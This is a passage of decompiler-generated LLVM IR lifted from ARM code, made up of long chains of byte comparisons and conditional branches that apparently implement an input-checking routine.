  %v7_ff3c = icmp eq i32 %v1_e8d4, 52
  %.2035 = zext i1 %v7_ff3c to i32
  store i32 %.2035, i32* %r3.global-to-local, align 4
  %v2_ff48 = and i32 %.2035, %v0_ff48
  %v4_ff48 = icmp eq i32 %v2_ff48, 0
  store i1 %v4_ff48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ff48, label %dec_label_pc_ff58, label %dec_label_pc_ff50

dec_label_pc_ff50:                                ; preds = %dec_label_pc_ff38
  store i1 %v2_f980, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f980, i1* %cpsr_z.global-to-local, align 1
  %v2_ff54 = xor i1 %v2_f980, true
  %v3_ff54 = or i1 %v7_f980, %v2_ff54
  br i1 %v3_ff54, label %dec_label_pc_e8d0, label %dec_label_pc_ff58.thread

dec_label_pc_ff58.thread:                         ; preds = %dec_label_pc_ff50
  store i1 %v2_f980, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f980, i1* %cpsr_z.global-to-local, align 1
  br label %bb1870

dec_label_pc_ff58:                                ; preds = %dec_label_pc_ff38
  %.pre2180 = xor i1 %v2_f980, true
  %.pre2181 = or i1 %v7_f980, %.pre2180
  store i1 %v2_f980, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f980, i1* %cpsr_z.global-to-local, align 1
  br i1 %.pre2181, label %bb1869, label %bb1870

bb1869:                                           ; preds = %dec_label_pc_ff58
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1870

bb1870:                                           ; preds = %dec_label_pc_ff58.thread, %dec_label_pc_ff58, %bb1869
  %v4_ff60 = phi i32 [ %.2035, %dec_label_pc_ff58 ], [ 0, %bb1869 ], [ %.2035, %dec_label_pc_ff58.thread ]
  %v3_ff5c.pre-phi2183 = phi i1 [ false, %dec_label_pc_ff58 ], [ true, %bb1869 ], [ false, %dec_label_pc_ff58.thread ]
  %v2_ff60 = xor i1 %v7_f980, true
  %v3_ff60 = and i1 %v2_f980, %v2_ff60
  br i1 %v3_ff60, label %bb1871, label %thread-pre-split593

bb1871:                                           ; preds = %bb1870
  store i32 %v4_ff60, i32* %r3.global-to-local, align 4
  br label %thread-pre-split593

thread-pre-split593:                              ; preds = %bb1870, %bb1871
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff64 = icmp eq i32 %v4_ff60, 0
  store i1 %v2_ff64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff64, label %dec_label_pc_ff74, label %dec_label_pc_ff6c

dec_label_pc_ff6c:                                ; preds = %thread-pre-split593
  %v2_ff6c = icmp eq i32 %v1_e8e8, 255
  store i1 %v2_ff6c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb6c, label %dec_label_pc_ff74, label %dec_label_pc_e8d0

dec_label_pc_ff74:                                ; preds = %dec_label_pc_ff6c, %thread-pre-split593
  %v2_ff78 = icmp ugt i32 %v1_e8d4, 53
  store i1 %v2_ff78, i1* %cpsr_c.global-to-local, align 1
  %v7_ff78 = icmp eq i32 %v1_e8d4, 54
  %.2036 = zext i1 %v7_ff78 to i32
  store i32 %.2036, i32* %r3.global-to-local, align 4
  %v2_ff84 = and i32 %.2036, %v0_ff84
  %v4_ff84 = icmp eq i32 %v2_ff84, 0
  store i1 %v4_ff84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_ff84, label %dec_label_pc_ff94, label %dec_label_pc_ff8c

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff74
  store i1 %v2_f980, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ff5c.pre-phi2183, label %dec_label_pc_e8d0, label %dec_label_pc_ff94

dec_label_pc_ff94:                                ; preds = %dec_label_pc_ff8c, %dec_label_pc_ff74
  %v2_ff94 = icmp ugt i32 %v1_e8e8, 142
  store i1 %v2_ff94, i1* %cpsr_c.global-to-local, align 1
  %v7_ff94 = icmp eq i32 %v1_e8e8, 143
  store i1 %v7_ff94, i1* %cpsr_z.global-to-local, align 1
  %v2_ff98 = xor i1 %v2_ff94, true
  %v3_ff98 = or i1 %v7_ff94, %v2_ff98
  br i1 %v3_ff98, label %bb1874, label %bb1875

bb1874:                                           ; preds = %dec_label_pc_ff94
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1875

bb1875:                                           ; preds = %dec_label_pc_ff94, %bb1874
  %v4_ff9c = phi i32 [ %.2036, %dec_label_pc_ff94 ], [ 0, %bb1874 ]
  %v2_ff9c = xor i1 %v7_ff94, true
  %v3_ff9c = and i1 %v2_ff94, %v2_ff9c
  br i1 %v3_ff9c, label %bb1876, label %thread-pre-split595

bb1876:                                           ; preds = %bb1875
  store i32 %v4_ff9c, i32* %r3.global-to-local, align 4
  br label %thread-pre-split595

thread-pre-split595:                              ; preds = %bb1875, %bb1876
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffa0 = icmp eq i32 %v4_ff9c, 0
  store i1 %v2_ffa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffa0, label %dec_label_pc_ffb0, label %dec_label_pc_ffa8

dec_label_pc_ffa8:                                ; preds = %thread-pre-split595
  %v2_ffa8 = icmp eq i32 %v1_e8e8, 255
  store i1 %v2_ffa8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb6c, label %dec_label_pc_ffb0, label %dec_label_pc_e8d0

dec_label_pc_ffb0:                                ; preds = %dec_label_pc_ffa8, %thread-pre-split595
  %v7_ffb0 = icmp eq i32 %v1_e8d4, 13
  %.2037 = zext i1 %v7_ffb0 to i32
  %v2_ffbc = icmp ugt i32 %v1_e8e8, 50
  store i1 %v2_ffbc, i1* %cpsr_c.global-to-local, align 1
  %v7_ffbc = icmp eq i32 %v1_e8e8, 51
  store i1 %v7_ffbc, i1* %cpsr_z.global-to-local, align 1
  %v2_ffc0 = xor i1 %v2_ffbc, true
  %v3_ffc0 = or i1 %v7_ffbc, %v2_ffc0
  br i1 %v3_ffc0, label %bb1879, label %bb1880

bb1879:                                           ; preds = %dec_label_pc_ffb0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1880

bb1880:                                           ; preds = %dec_label_pc_ffb0, %bb1879
  %v0_ffc8.pr = phi i32 [ %v4_ff9c, %dec_label_pc_ffb0 ], [ 0, %bb1879 ]
  %v2_ffc4 = xor i1 %v7_ffbc, true
  %v3_ffc4 = and i1 %v2_ffbc, %v2_ffc4
  br i1 %v3_ffc4, label %bb1881, label %thread-pre-split597

bb1881:                                           ; preds = %bb1880
  store i32 %.2037, i32* %r3.global-to-local, align 4
  br label %thread-pre-split597

thread-pre-split597:                              ; preds = %bb1880, %bb1881
  %v0_ffc8 = phi i32 [ %.2037, %bb1881 ], [ %v0_ffc8.pr, %bb1880 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffc8 = icmp eq i32 %v0_ffc8, 0
  store i1 %v2_ffc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffc8, label %dec_label_pc_ffd8, label %dec_label_pc_ffd0

dec_label_pc_ffd0:                                ; preds = %thread-pre-split597
  store i1 %v2_ec50, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f310, label %dec_label_pc_e8d0, label %dec_label_pc_ffd8

dec_label_pc_ffd8:                                ; preds = %dec_label_pc_ffd0, %thread-pre-split597
  store i1 %v2_fca4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fca4, i1* %cpsr_z.global-to-local, align 1
  %v2_ffdc = xor i1 %v2_fca4, true
  %v3_ffdc = or i1 %v7_fca4, %v2_ffdc
  br i1 %v3_ffdc, label %bb1882, label %bb1883

bb1882:                                           ; preds = %dec_label_pc_ffd8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1883

bb1883:                                           ; preds = %dec_label_pc_ffd8, %bb1882
  %v0_ffe4.pr = phi i32 [ %v0_ffc8, %dec_label_pc_ffd8 ], [ 0, %bb1882 ]
  %v2_ffe0 = xor i1 %v7_fca4, true
  %v3_ffe0 = and i1 %v2_fca4, %v2_ffe0
  br i1 %v3_ffe0, label %bb1884, label %thread-pre-split598

bb1884:                                           ; preds = %bb1883
  store i32 %.2037, i32* %r3.global-to-local, align 4
  br label %thread-pre-split598

thread-pre-split598:                              ; preds = %bb1883, %bb1884
  %v0_ffe4 = phi i32 [ %.2037, %bb1884 ], [ %v0_ffe4.pr, %bb1883 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffe4 = icmp eq i32 %v0_ffe4, 0
  store i1 %v2_ffe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffe4, label %dec_label_pc_fff4, label %dec_label_pc_ffec

dec_label_pc_ffec:                                ; preds = %thread-pre-split598
  store i1 %v2_e9fc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9fc, i1* %cpsr_z.global-to-local, align 1
  %v2_fff0 = xor i1 %v2_e9fc, true
  %v3_fff0 = or i1 %v7_e9fc, %v2_fff0
  br i1 %v3_fff0, label %dec_label_pc_e8d0, label %dec_label_pc_fff4

dec_label_pc_fff4:                                ; preds = %dec_label_pc_ffec, %thread-pre-split598
  %v2_fff4 = icmp ugt i32 %v1_e8e8, 171
  store i1 %v2_fff4, i1* %cpsr_c.global-to-local, align 1
  %v7_fff4 = icmp eq i32 %v1_e8e8, 172
  store i1 %v7_fff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fff4, label %.thread599, label %.thread600

.thread600:                                       ; preds = %dec_label_pc_fff4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10008

.thread599:                                       ; preds = %dec_label_pc_fff4
  store i32 %.2015, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10000 = icmp eq i1 %v7_f238, false
  store i1 %v2_10000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10000, label %dec_label_pc_10008, label %dec_label_pc_e8d0

dec_label_pc_10008:                               ; preds = %.thread600, %.thread599
  %v2_10008 = icmp ugt i32 %v1_e8e8, 13
  store i1 %v2_10008, i1* %cpsr_c.global-to-local, align 1
  %v7_10008 = icmp eq i32 %v1_e8e8, 14
  store i1 %v7_10008, i1* %cpsr_z.global-to-local, align 1
  %v2_1000c = xor i1 %v2_10008, true
  %v3_1000c = or i1 %v7_10008, %v2_1000c
  br i1 %v3_1000c, label %bb1885, label %bb1886

bb1885:                                           ; preds = %dec_label_pc_10008
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1886

bb1886:                                           ; preds = %dec_label_pc_10008, %bb1885
  %v2_10010 = xor i1 %v7_10008, true
  %v3_10010 = and i1 %v2_10008, %v2_10010
  br i1 %v3_10010, label %thread-pre-split603, label %thread-pre-split603.thread

thread-pre-split603.thread:                       ; preds = %bb1886
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10440

thread-pre-split603:                              ; preds = %bb1886
  store i32 %.2032, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10014 = icmp eq i1 %v7_fb58, false
  store i1 %v2_10014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10014, label %dec_label_pc_10440, label %dec_label_pc_1001c

dec_label_pc_1001c:                               ; preds = %thread-pre-split603
  %v2_1001c = icmp eq i32 %v1_e8e8, 255
  store i1 %v2_1001c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb6c, label %dec_label_pc_10024, label %dec_label_pc_e8d0

dec_label_pc_10024:                               ; preds = %dec_label_pc_10440, %bb1920, %bb1918, %dec_label_pc_1001c
  %v2_10024 = icmp ugt i32 %v1_e8d4, 211
  store i1 %v2_10024, i1* %cpsr_c.global-to-local, align 1
  %v7_10024 = icmp eq i32 %v1_e8d4, 212
  store i1 %v7_10024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10024, label %.thread604, label %.thread605

.thread605:                                       ; preds = %dec_label_pc_10024
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10044

.thread604:                                       ; preds = %dec_label_pc_10024
  store i32 %.2022, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10030 = icmp eq i1 %v7_f4a8, false
  store i1 %v2_10030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10030, label %dec_label_pc_10044, label %dec_label_pc_10038

dec_label_pc_10038:                               ; preds = %.thread604
  %v2_10038 = icmp eq i32 %v1_e8ec, 255
  store i1 %v2_10038, i1* %cpsr_c.global-to-local, align 1
  %v7_10038 = icmp eq i32 %v1_e8ec, 255
  store i1 %v7_10038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10038, label %dec_label_pc_10044, label %bb1887

bb1887:                                           ; preds = %dec_label_pc_10038
  %v3_1003c = icmp ugt i32 %v1_e8ec, 222
  store i1 %v3_1003c, i1* %cpsr_c.global-to-local, align 1
  %v8_1003c = icmp eq i32 %v1_e8ec, 223
  store i1 %v8_1003c, i1* %cpsr_z.global-to-local, align 1
  %v2_10040 = xor i1 %v8_1003c, true
  %v3_10040 = and i1 %v3_1003c, %v2_10040
  br i1 %v3_10040, label %dec_label_pc_e8d0, label %dec_label_pc_10044

dec_label_pc_10044:                               ; preds = %dec_label_pc_10038, %.thread605, %bb1887, %.thread604
  store i32 %.1995, i32* %r3.global-to-local, align 4
  %v2_10048 = icmp ugt i32 %v1_e8d4, 88
  store i1 %v2_10048, i1* %cpsr_c.global-to-local, align 1
  %v7_10048 = icmp eq i32 %v1_e8d4, 89
  store i1 %v7_10048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10048, label %.thread608, label %.thread609

.thread609:                                       ; preds = %dec_label_pc_10044
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10078

.thread608:                                       ; preds = %dec_label_pc_10044
  store i32 %.1995, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10054 = icmp eq i1 %v7_ec6c, false
  store i1 %v2_10054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10054, label %dec_label_pc_10078, label %dec_label_pc_1005c

dec_label_pc_1005c:                               ; preds = %.thread608
  %v2_1005c = icmp ugt i32 %v1_e8ec, 94
  store i1 %v2_1005c, i1* %cpsr_c.global-to-local, align 1
  %v7_1005c = icmp eq i32 %v1_e8ec, 95
  store i1 %v7_1005c, i1* %cpsr_z.global-to-local, align 1
  %v2_10060 = xor i1 %v2_1005c, true
  %v3_10060 = or i1 %v7_1005c, %v2_10060
  br i1 %v3_10060, label %bb1888, label %bb1889

bb1888:                                           ; preds = %dec_label_pc_1005c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1889

bb1889:                                           ; preds = %dec_label_pc_1005c, %bb1888
  %v0_10070.pr1059 = phi i32 [ %.1995, %dec_label_pc_1005c ], [ 0, %bb1888 ]
  %v2_10064 = xor i1 %v7_1005c, true
  %v3_10064 = and i1 %v2_1005c, %v2_10064
  br i1 %v3_10064, label %bb1890, label %bb1891

bb1890:                                           ; preds = %bb1889
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1891

bb1891:                                           ; preds = %bb1889, %bb1890
  %v0_10070.pr = phi i32 [ %v0_10070.pr1059, %bb1889 ], [ 1, %bb1890 ]
  %v2_10068 = icmp ugt i32 %v1_e8ec, 95
  store i1 %v2_10068, i1* %cpsr_c.global-to-local, align 1
  %v7_10068 = icmp eq i32 %v1_e8ec, 96
  store i1 %v7_10068, i1* %cpsr_z.global-to-local, align 1
  %v2_1006c = xor i1 %v7_10068, true
  %v3_1006c = and i1 %v2_10068, %v2_1006c
  br i1 %v3_1006c, label %.thread613, label %bb1892

.thread613:                                       ; preds = %bb1891
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10078

bb1892:                                           ; preds = %bb1891
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10070 = icmp eq i32 %v0_10070.pr, 0
  store i1 %v2_10070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10070, label %dec_label_pc_10078, label %dec_label_pc_e8d0

dec_label_pc_10078:                               ; preds = %.thread613, %.thread609, %bb1892, %.thread608
  %v7_10078 = icmp eq i32 %v1_e8d4, 219
  %.2038 = zext i1 %v7_10078 to i32
  store i32 %.2038, i32* %r3.global-to-local, align 4
  %v2_10084 = icmp ugt i32 %v1_e8e8, 214
  store i1 %v2_10084, i1* %cpsr_c.global-to-local, align 1
  %v7_10084 = icmp eq i32 %v1_e8e8, 215
  store i1 %v7_10084, i1* %cpsr_z.global-to-local, align 1
  %v2_10088 = xor i1 %v2_10084, true
  %v3_10088 = or i1 %v7_10084, %v2_10088
  br i1 %v3_10088, label %.thread618, label %bb1895

.thread618:                                       ; preds = %dec_label_pc_10078
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1009c

bb1895:                                           ; preds = %dec_label_pc_10078
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1008c = icmp eq i1 %v7_10078, false
  store i1 %v2_1008c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1008c, label %dec_label_pc_1009c, label %dec_label_pc_10094

dec_label_pc_10094:                               ; preds = %bb1895
  %v2_10094 = icmp ugt i32 %v1_e8e8, 229
  store i1 %v2_10094, i1* %cpsr_c.global-to-local, align 1
  %v7_10094 = icmp eq i32 %v1_e8e8, 230
  store i1 %v7_10094, i1* %cpsr_z.global-to-local, align 1
  %v2_10098 = xor i1 %v2_10094, true
  %v3_10098 = or i1 %v7_10094, %v2_10098
  br i1 %v3_10098, label %dec_label_pc_e8d0, label %dec_label_pc_1009c

dec_label_pc_1009c:                               ; preds = %.thread618, %dec_label_pc_10094, %bb1895
  %v7_1009c = icmp eq i32 %v1_e8d4, 23
  %.2039 = zext i1 %v7_1009c to i32
  store i32 %.2039, i32* %r3.global-to-local, align 4
  store i1 %v2_fe78, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fe78, i1* %cpsr_z.global-to-local, align 1
  %v2_100ac = xor i1 %v2_fe78, true
  %v3_100ac = or i1 %v7_fe78, %v2_100ac
  br i1 %v3_100ac, label %.thread623, label %bb1898

.thread623:                                       ; preds = %dec_label_pc_1009c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_100c0

bb1898:                                           ; preds = %dec_label_pc_1009c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100b0 = icmp eq i1 %v7_1009c, false
  store i1 %v2_100b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_100b0, label %dec_label_pc_100c0, label %dec_label_pc_100b8

dec_label_pc_100b8:                               ; preds = %bb1898
  %v2_100b8 = icmp ugt i32 %v1_e8e8, 107
  store i1 %v2_100b8, i1* %cpsr_c.global-to-local, align 1
  %v7_100b8 = icmp eq i32 %v1_e8e8, 108
  store i1 %v7_100b8, i1* %cpsr_z.global-to-local, align 1
  %v2_100bc = xor i1 %v2_100b8, true
  %v3_100bc = or i1 %v7_100b8, %v2_100bc
  br i1 %v3_100bc, label %dec_label_pc_e8d0, label %dec_label_pc_100c0

dec_label_pc_100c0:                               ; preds = %.thread623, %dec_label_pc_100b8, %bb1898
  store i32 %.2020, i32* %r3.global-to-local, align 4
  store i1 %v2_f840, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f840, i1* %cpsr_z.global-to-local, align 1
  %v2_100c8 = xor i1 %v2_f840, true
  %v3_100c8 = or i1 %v7_f840, %v2_100c8
  br i1 %v3_100c8, label %bb1899, label %bb1900

bb1899:                                           ; preds = %dec_label_pc_100c0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1900

bb1900:                                           ; preds = %dec_label_pc_100c0, %bb1899
  %v4_100cc = phi i32 [ %.2020, %dec_label_pc_100c0 ], [ 0, %bb1899 ]
  %v2_100cc = xor i1 %v7_f840, true
  %v3_100cc = and i1 %v2_f840, %v2_100cc
  br i1 %v3_100cc, label %bb1901, label %thread-pre-split626

bb1901:                                           ; preds = %bb1900
  store i32 %v4_100cc, i32* %r3.global-to-local, align 4
  br label %thread-pre-split626

thread-pre-split626:                              ; preds = %bb1900, %bb1901
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100d0 = icmp eq i32 %v4_100cc, 0
  store i1 %v2_100d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_100d0, label %dec_label_pc_100e0, label %dec_label_pc_100d8

dec_label_pc_100d8:                               ; preds = %thread-pre-split626
  store i1 %v2_f3d4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f3d4, i1* %cpsr_z.global-to-local, align 1
  %v2_100dc = xor i1 %v2_f3d4, true
  %v3_100dc = or i1 %v7_f3d4, %v2_100dc
  br i1 %v3_100dc, label %dec_label_pc_e8d0, label %dec_label_pc_100e0

dec_label_pc_100e0:                               ; preds = %dec_label_pc_100d8, %thread-pre-split626
  %v7_100e0 = icmp eq i32 %v1_e8d4, 106
  %.2040 = zext i1 %v7_100e0 to i32
  store i32 %.2040, i32* %r3.global-to-local, align 4
  store i1 %v2_fc28, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fc28, i1* %cpsr_z.global-to-local, align 1
  %v2_100f0 = xor i1 %v2_fc28, true
  %v3_100f0 = or i1 %v7_fc28, %v2_100f0
  br i1 %v3_100f0, label %.thread629, label %bb1904

.thread629:                                       ; preds = %dec_label_pc_100e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10104

bb1904:                                           ; preds = %dec_label_pc_100e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100f4 = icmp eq i1 %v7_100e0, false
  store i1 %v2_100f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_100f4, label %dec_label_pc_10104, label %dec_label_pc_100fc

dec_label_pc_100fc:                               ; preds = %bb1904
  %v2_100fc = icmp ugt i32 %v1_e8e8, 187
  store i1 %v2_100fc, i1* %cpsr_c.global-to-local, align 1
  %v7_100fc = icmp eq i32 %v1_e8e8, 188
  store i1 %v7_100fc, i1* %cpsr_z.global-to-local, align 1
  %v2_10100 = xor i1 %v2_100fc, true
  %v3_10100 = or i1 %v7_100fc, %v2_10100
  br i1 %v3_10100, label %dec_label_pc_e8d0, label %dec_label_pc_10104

dec_label_pc_10104:                               ; preds = %.thread629, %dec_label_pc_100fc, %bb1904
  %v7_10104 = icmp eq i32 %v1_e8d4, 34
  %.2041 = zext i1 %v7_10104 to i32
  store i32 %.2041, i32* %r3.global-to-local, align 4
  %v2_10110 = icmp ugt i32 %v1_e8e8, 243
  store i1 %v2_10110, i1* %cpsr_c.global-to-local, align 1
  %v7_10110 = icmp eq i32 %v1_e8e8, 244
  store i1 %v7_10110, i1* %cpsr_z.global-to-local, align 1
  %v2_10114 = xor i1 %v2_10110, true
  %v3_10114 = or i1 %v7_10110, %v2_10114
  br i1 %v3_10114, label %.thread634, label %bb1907

.thread634:                                       ; preds = %dec_label_pc_10104
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10128

bb1907:                                           ; preds = %dec_label_pc_10104
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10118 = icmp eq i1 %v7_10104, false
  store i1 %v2_10118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10118, label %dec_label_pc_10128, label %dec_label_pc_10120

dec_label_pc_10120:                               ; preds = %bb1907
  %v2_10120 = icmp eq i32 %v1_e8e8, 255
  store i1 %v2_10120, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fb6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb6c, label %dec_label_pc_10128, label %dec_label_pc_e8d0

dec_label_pc_10128:                               ; preds = %.thread634, %dec_label_pc_10120, %bb1907
  %v7_10128 = icmp eq i32 %v1_e8d4, 87
  %.2042 = zext i1 %v7_10128 to i32
  store i32 %.2042, i32* %r3.global-to-local, align 4
  store i1 %v2_eb74, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eb74, i1* %cpsr_z.global-to-local, align 1
  %v2_10138 = xor i1 %v2_eb74, true
  %v3_10138 = or i1 %v7_eb74, %v2_10138
  br i1 %v3_10138, label %.thread639, label %bb1910

.thread639:                                       ; preds = %dec_label_pc_10128
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1014c

bb1910:                                           ; preds = %dec_label_pc_10128
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1013c = icmp eq i1 %v7_10128, false
  store i1 %v2_1013c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1013c, label %dec_label_pc_1014c, label %dec_label_pc_10144

dec_label_pc_10144:                               ; preds = %bb1910
  store i1 %v2_e9bc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_efec, label %dec_label_pc_e8d0, label %dec_label_pc_1014c

dec_label_pc_1014c:                               ; preds = %.thread639, %dec_label_pc_10144, %bb1910
  %v7_1014c = icmp eq i32 %v1_e8d4, 86
  %.2043 = zext i1 %v7_1014c to i32
  store i32 %.2043, i32* %r3.global-to-local, align 4
  %v2_10158 = icmp ugt i32 %v1_e8e8, 207
  store i1 %v2_10158, i1* %cpsr_c.global-to-local, align 1
  %v7_10158 = icmp eq i32 %v1_e8e8, 208
  store i1 %v7_10158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10158, label %bb1913, label %dec_label_pc_10164

bb1913:                                           ; preds = %dec_label_pc_1014c
  %v2_1014c = icmp ugt i32 %v1_e8d4, 85
  store i1 %v2_1014c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_1014c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1014c, label %dec_label_pc_e8d0, label %dec_label_pc_10164

dec_label_pc_10164:                               ; preds = %dec_label_pc_1014c, %bb1913
  %v2_10164 = and i32 %.2043, %.2031
  %v4_10164 = icmp eq i32 %v2_10164, 0
  store i1 %v4_10164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_10164, label %dec_label_pc_1016c, label %dec_label_pc_e8d0

dec_label_pc_1016c:                               ; preds = %dec_label_pc_10164
  %v2_1016c = icmp ugt i32 %v1_e8d4, 192
  store i1 %v2_1016c, i1* %cpsr_c.global-to-local, align 1
  %v7_1016c = icmp eq i32 %v1_e8d4, 193
  store i1 %v7_1016c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1016c, label %bb1914, label %dec_label_pc_10178

bb1914:                                           ; preds = %dec_label_pc_1016c
  store i1 %v2_f000, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f000, label %dec_label_pc_e8d0, label %dec_label_pc_10178

dec_label_pc_10178:                               ; preds = %dec_label_pc_1016c, %bb1914
  store i32 %v1_f03c, i32* %r3.global-to-local, align 4
  %v2_1017c = icmp ugt i32 %v1_e8d4, 119
  store i1 %v2_1017c, i1* %cpsr_c.global-to-local, align 1
  %v7_1017c = icmp eq i32 %v1_e8d4, 120
  store i1 %v7_1017c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1017c, label %.thread645, label %.thread646

.thread646:                                       ; preds = %dec_label_pc_10178
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10198

.thread645:                                       ; preds = %dec_label_pc_10178
  %v2_10184 = urem i32 %v1_f03c, 2
  store i32 %v2_10184, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10188 = icmp eq i32 %v2_10184, 0
  store i1 %v2_10188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10188, label %dec_label_pc_10198, label %dec_label_pc_10190

dec_label_pc_10190:                               ; preds = %.thread645
  %v2_10190 = icmp ugt i32 %v1_e8e8, 106
  store i1 %v2_10190, i1* %cpsr_c.global-to-local, align 1
  %v7_10190 = icmp eq i32 %v1_e8e8, 107
  store i1 %v7_10190, i1* %cpsr_z.global-to-local, align 1
  %v2_10194 = xor i1 %v2_10190, true
  %v3_10194 = or i1 %v7_10190, %v2_10194
  br i1 %v3_10194, label %dec_label_pc_e8d0, label %dec_label_pc_10198

